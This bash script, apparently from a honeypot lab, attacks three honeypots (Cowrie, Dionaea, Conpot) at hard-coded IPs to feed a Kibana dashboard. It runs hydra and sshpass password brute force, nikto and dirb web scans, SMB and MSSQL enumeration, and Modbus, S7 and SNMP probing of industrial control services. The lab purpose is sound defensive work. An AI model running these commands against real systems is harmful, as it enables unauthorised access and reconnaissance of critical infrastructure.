#!/bin/bash

# ============================================================
# Honeynet Attack Script
# Attacks all three honeypots: Cowrie, Dionaea, Conpot
# ============================================================

# === CONFIGURATION — UPDATE THESE IPs ===
COWRIE_IP="161.118.184.101"
DIONAEA_IP="<DIONAEA_IP>"
CONPOT_IP="34.135.97.186"
PASSWORD_LIST="/home/shield/Downloads/top-passwords-shortlist.txt"

# === COLORS FOR OUTPUT ===
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# === BANNER ===
echo -e "${PURPLE}"
echo "============================================"
echo "    HONEYNET ATTACK SCRIPT"
echo "    Targeting 3 honeypots"
echo "============================================"
echo -e "${NC}"

# === HELPER FUNCTION ===
section() {
    echo ""
    echo -e "${YELLOW}=========================================${NC}"
    echo -e "${YELLOW}  $1${NC}"
    echo -e "${YELLOW}=========================================${NC}"
}

# ============================================================
# 1. ATTACKS ON COWRIE (SSH/Telnet honeypot)
# ============================================================
section "ATTACKING COWRIE (SSH/Telnet) - $COWRIE_IP"

echo -e "${BLUE}[*] Port scan...${NC}"
nmap -sV -p 22,23 $COWRIE_IP

echo -e "${BLUE}[*] SSH brute force with hydra (root)...${NC}"
hydra -l root -P $PASSWORD_LIST -t 4 -f -I ssh://$COWRIE_IP 2>/dev/null

echo -e "${BLUE}[*] SSH brute force with hydra (admin)...${NC}"
hydra -l admin -P $PASSWORD_LIST -t 4 -f -I ssh://$COWRIE_IP 2>/dev/null

echo -e "${BLUE}[*] Trying common usernames...${NC}"
for user in root admin ubuntu pi user test guest oracle postgres mysql; do
    sshpass -p "123456" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
        $user@$COWRIE_IP "whoami; id; uname -a" 2>/dev/null
done

echo -e "${BLUE}[*] Telnet brute force...${NC}"
hydra -l root -P $PASSWORD_LIST -t 4 -f telnet://$COWRIE_IP 2>/dev/null

# ============================================================
# 2. ATTACKS ON DIONAEA (Malware honeypot)
# ============================================================
section "ATTACKING DIONAEA (Malware) - $DIONAEA_IP"

echo -e "${BLUE}[*] Port scan...${NC}"
nmap -sV -p 21,80,443,445,1433,3306,5060 $DIONAEA_IP

echo -e "${BLUE}[*] FTP brute force...${NC}"
hydra -l admin -P $PASSWORD_LIST -t 4 -f ftp://$DIONAEA_IP 2>/dev/null
hydra -l anonymous -p anonymous@test.com -t 1 ftp://$DIONAEA_IP 2>/dev/null

echo -e "${BLUE}[*] MySQL brute force...${NC}"
hydra -l root -P $PASSWORD_LIST -t 4 -f mysql://$DIONAEA_IP 2>/dev/null

echo -e "${BLUE}[*] HTTP scan with Nikto...${NC}"
timeout 30 nikto -h http://$DIONAEA_IP -timeout 10 2>/dev/null

echo -e "${BLUE}[*] HTTP directory enumeration...${NC}"
timeout 20 dirb http://$DIONAEA_IP /usr/share/wordlists/dirb/common.txt -S 2>/dev/null

echo -e "${BLUE}[*] SMB enumeration...${NC}"
nmap --script smb-enum-shares,smb-enum-users -p 445 $DIONAEA_IP 2>/dev/null

echo -e "${BLUE}[*] MSSQL connection attempts...${NC}"
nmap --script ms-sql-info,ms-sql-empty-password -p 1433 $DIONAEA_IP 2>/dev/null

echo -e "${BLUE}[*] SIP/VoIP scan...${NC}"
nmap --script sip-methods -p 5060 $DIONAEA_IP 2>/dev/null

# ============================================================
# 3. ATTACKS ON CONPOT (ICS/SCADA honeypot)
# ============================================================
section "ATTACKING CONPOT (ICS/SCADA) - $CONPOT_IP"

echo -e "${BLUE}[*] Port scan...${NC}"
nmap -sV -p 21,80,102,502,623,44818 $CONPOT_IP

echo -e "${BLUE}[*] Modbus discovery...${NC}"
nmap --script modbus-discover -p 502 $CONPOT_IP 2>/dev/null

echo -e "${BLUE}[*] S7comm scan (Siemens PLC)...${NC}"
nmap --script s7-info -p 102 $CONPOT_IP 2>/dev/null

echo -e "${BLUE}[*] HTTP requests on industrial web interface...${NC}"
curl -s http://$CONPOT_IP/ -m 10 > /dev/null
curl -s http://$CONPOT_IP/index.html -m 10 > /dev/null
curl -s http://$CONPOT_IP/admin -m 10 > /dev/null
curl -s http://$CONPOT_IP/login -m 10 > /dev/null

echo -e "${BLUE}[*] SNMP walk...${NC}"
timeout 15 snmpwalk -v2c -c public $CONPOT_IP 2>/dev/null | head -20
timeout 15 snmpwalk -v1 -c public $CONPOT_IP 2>/dev/null | head -10

echo -e "${BLUE}[*] FTP attempts...${NC}"
hydra -l admin -P $PASSWORD_LIST -t 4 -f ftp://$CONPOT_IP 2>/dev/null

echo -e "${BLUE}[*] Modbus client read attempts...${NC}"
python3 -c "
try:
    from pymodbus.client import ModbusTcpClient
    client = ModbusTcpClient('$CONPOT_IP', port=502)
    if client.connect():
        for addr in [0, 100, 200, 1000]:
            try:
                client.read_holding_registers(addr, 10)
            except: pass
        client.close()
        print('Modbus read attempts complete')
except ImportError:
    print('pymodbus not installed - skipping')
" 2>/dev/null

# ============================================================
# COMPLETE
# ============================================================
section "ATTACK SCRIPT COMPLETE"
echo -e "${GREEN}[+] All attacks finished${NC}"
echo -e "${GREEN}[+] Check your Kibana dashboard at: http://34.42.54.123:5601${NC}"
echo -e "${GREEN}[+] Filter by time range: Last 15 minutes${NC}"
echo ""
